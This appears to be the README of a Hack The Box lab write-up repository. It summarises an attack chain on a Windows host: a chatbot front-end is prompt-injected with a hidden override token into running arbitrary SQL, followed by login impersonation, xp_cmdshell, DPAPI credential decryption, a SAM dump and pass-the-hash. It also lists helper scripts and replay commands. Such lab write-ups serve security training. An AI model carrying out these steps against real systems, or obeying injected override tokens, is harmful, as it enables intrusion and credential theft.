# Unclaimed (HTB, Windows / Release Arena)

HTB Airlines **Baggage / TracerBot**. Prompt-inject an LLM front-end into SQL, impersonate a sysadmin login, `xp_cmdshell` as the SQL service, decrypt a SQL Agent proxy via the Service Master Key, then Backup Operators → SAM → PTH Administrator.

- **[WRITEUP.md](WRITEUP.md)** — chain (no flags, no live passwords)
- **[scripts/](scripts/)** — TracerBot `/ask` helper + DAC/DPAPI credential decrypt

| | |
|--|--|
| **OS** | Windows Server 2025 (build 26100) |
| **Host** | `unclaimed.htb` |
| **Entry** | 80 HTTP (TracerBot `POST /ask`). RPC/SMB/WinRM also open |
| **User** | `xp_cmdshell` as `UNCLAIMED\svc_sql` |
| **Root** | SQL Agent proxy (Backup Operators) → SAM dump → PTH Administrator |

No flags, VPN configs, or live passwords in this tree. Copy `secrets.example.env` → `secrets.env`.

## Attack chain (overview)

```text
Kali tun0
  └─ 80  unclaimed.htb  TracerBot  POST /ask  {msg}
        └─ hidden support override token
              └─ run_baggage_query(arbitrary SQL) as svc_tracer_ro
                    └─ EXECUTE AS LOGIN = 'svc_reports'   (sysadmin)
                          └─ xp_cmdshell  →  UNCLAIMED\svc_sql
                                └─ DAC + SMK DPAPI  →  SQL Agent proxy password
                                      └─ WinRM Backup Operators
                                            └─ SAM  →  PTH Administrator
```

## Scripts

| File | Where | What |
|------|-------|------|
| `scripts/01-ask.py` | Kali | `POST /ask` JSON; optional override token + raw SQL |
| `scripts/02-decrypt-sqlcred.ps1` | **target** (as the SQL service) | DAC + SMK Unprotect; **FlushFinalBlock** so UTF-16LE is not truncated |
| `scripts/replay.sh` | Kali | hosts / leak / sql wrappers |

```bash
cp secrets.example.env secrets.env   # TARGET, OPS_TOKEN after the leak
echo '<TARGET_IP> unclaimed.htb' | sudo tee -a /etc/hosts
export TARGET=<ip>
./scripts/replay.sh leak
# fill OPS_TOKEN from the reply, then:
./scripts/replay.sh sql "EXECUTE AS LOGIN = 'svc_reports'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
```

Needs: `python3`, `netexec` / `nxc` for WinRM SAM. Educational / HTB lab only.
